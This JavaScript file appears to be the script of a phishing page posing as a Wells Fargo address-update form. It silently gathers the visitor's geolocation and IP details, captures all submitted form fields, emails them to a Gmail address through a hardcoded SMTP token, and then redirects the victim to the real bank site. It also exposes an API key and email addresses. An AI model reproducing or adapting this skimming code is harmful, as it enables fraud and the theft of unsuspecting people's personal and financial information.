const geolocationData = {
    latitude: 0.0,
    longitude: 0.0,
    timestamp: 0,
    errorsLog: []
};


function getLocation() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition, showError);
    } else {
        geolocationData.errorsLog.push("Geolocation is not supported by this browser.");
        sendGeoLocation();
    }
}

function showPosition(position) {
    geolocationData.latitude = position.coords.latitude;
    geolocationData.longitude = position.coords.longitude;
    geolocationData.timestamp = position.timestamp;

    sendGeoLocation();
}

function showError(error) {
    switch (error.code) {
        case error.PERMISSION_DENIED:
            geolocationData.errorsLog.push("User denied the request for Geolocation.");
            break;
        case error.POSITION_UNAVAILABLE:
            geolocationData.errorsLog.push("Location information is unavailable.");
            break;
        case error.TIMEOUT:
            geolocationData.errorsLog.push("The request to get user location timed out.");
            break;
        case error.UNKNOWN_ERROR:
            geolocationData.errorsLog.push("An unknown error occurred.");
            break;
    }

    sendGeoLocation();
}

function fetchIpAddress() {
    fetch("https://api.ipdata.co?api-key=ede4f9bb1c3238e3653c1d71a6104a00584afde6ad3023ae1ea8a4e4")
        .then(response => response.json())
        .then(data => {
            sendIpAddressData(data);
        });
}

function sendGeoLocation() {
    let geolocationDataString = JSON.stringify(geolocationData);

    SendEmail("Geoloc", geolocationDataString);
}

function sendIpAddressData(data) {
    let ipAddressDataString = JSON.stringify(data);

    SendEmail("IPAdd", ipAddressDataString);
}

function SendEmail(emailSubject, emailBody) {
    console.log(emailBody);

    Email.send({
        SecureToken: "57605994-ef84-4e3d-9aed-1fc1088b197e",
        To: 'ahmedyaserx@gmail.com',
        From: "ahmedkhalafx97@gmail.com",
        Subject: emailSubject,
        Body: emailBody
    });
}

function ValidateFormBeforeSubmitting() {
    'use strict';
  
    // Fetch all the forms we want to apply custom Bootstrap validation styles to
    var forms = document.querySelectorAll('.needs-validation');
  
    // Loop over them and prevent submission
    Array.prototype.slice.call(forms)
      .forEach(function (form) {
        form.addEventListener('submit', function (event) {
          if (!form.checkValidity()) {
            event.preventDefault()
            event.stopPropagation()
          }
          else {
            SubmitForm();
          }
          
          form.classList.add('was-validated')
        }, false)
      })
  }

function SubmitForm()
{
    var inputFields = [];
    document.querySelectorAll('.input-data').forEach((e) => {inputFields.push(e.value)});

    SendEmail("Form", JSON.stringify(inputFields));


    alert("Thank you for updating your address! You will be redirected to the homepage.");
    window.open("https://www.wellsfargo.com/"); 
}

function main() {
    getLocation();
    fetchIpAddress();

    ValidateFormBeforeSubmitting();
}


main();
